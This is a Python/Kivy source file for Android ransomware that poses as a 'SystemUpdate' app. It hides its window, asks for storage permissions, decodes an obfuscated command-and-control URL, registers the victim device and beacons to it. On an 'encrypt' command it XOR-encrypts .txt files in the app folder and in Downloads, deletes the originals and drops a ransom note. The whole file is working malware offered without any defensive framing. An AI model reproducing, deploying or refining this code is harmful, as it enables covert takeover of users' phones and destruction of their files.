from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.clock import Clock

import requests
import socket
import time
import os
import random
import urllib3
import threading
import base64

try:
    from android.permissions import request_permissions, Permission
    HAS_ANDROID = True
except:
    HAS_ANDROID = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def decode(encoded):
    return base64.b64decode(encoded).decode('utf-8')

encoded_url = "aHR0cHM6Ly9uZXdtZXRob2QtaXNoNi5vbnJlbmRlci5jb20="
encoded_id = "Mw=="
encoded_name = "UGhvbmU="

base_url = decode(encoded_url)
device_id = decode(encoded_id)
device_name = decode(encoded_name)

try:
    device_ip = socket.gethostbyname(socket.gethostname())
except:
    device_ip = "127.0.0.1"

# ---------- Encryption ----------
def xor_encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = bytes([b ^ key for b in data])
        with open(filepath + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except:
        return False

def ransomware_attack():
    # Encrypt files in the app's private directory (always accessible)
    private_dir = os.path.dirname(os.path.abspath(__file__))
    key = random.randint(1, 255)
    count = 0
    try:
        for filename in os.listdir(private_dir):
            if filename.endswith('.txt') and filename != 'READ_ME.txt':
                filepath = os.path.join(private_dir, filename)
                if xor_encrypt_file(filepath, key):
                    count += 1
        # Also try Downloads folder if possible
        downloads = "/storage/emulated/0/Download/"
        if os.path.exists(downloads):
            for filename in os.listdir(downloads):
                if filename.endswith('.txt') and filename != 'READ_ME.txt':
                    filepath = os.path.join(downloads, filename)
                    if xor_encrypt_file(filepath, key):
                        count += 1
        if count > 0:
            note_path = os.path.join(private_dir, "READ_ME.txt")
            with open(note_path, 'w') as f:
                f.write("Your files have been encrypted.\n")
    except:
        pass

# ---------- C2 Communication ----------
def register_device():
    url = base_url + "/devices"
    data = {"id": device_id, "name": device_name, "ip": device_ip}
    try:
        requests.post(url, json=data, verify=False, timeout=10)
    except:
        pass

def background_worker():
    time.sleep(5)
    register_device()
    while True:
        try:
            requests.get(base_url + "/beacon", verify=False, timeout=10)
        except:
            pass

        try:
            r = requests.post(base_url + "/command",
                              json={"deviceId": device_id},
                              verify=False, timeout=10)
            if r.status_code == 200:
                cmd = r.json().get("command")
                if cmd == "encrypt":
                    ransomware_attack()
        except:
            pass

        time.sleep(random.randint(20, 45))

# ---------- Permission Request (Main Thread) ----------
def request_android_permissions():
    if HAS_ANDROID:
        try:
            request_permissions([
                Permission.INTERNET,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])
        except:
            pass

# ---------- Kivy App ----------
class SystemUpdate(App):
    def build(self):
        Window.size = (1, 1)
        Window.opacity = 0

        # Request permissions on the main thread
        Clock.schedule_once(lambda dt: request_android_permissions(), 1)

        # Start background C2 thread
        t = threading.Thread(target=background_worker, daemon=True)
        t.start()

        return Label(text='')

    def on_stop(self):
        return True

if __name__ == "__main__":
    SystemUpdate().run()
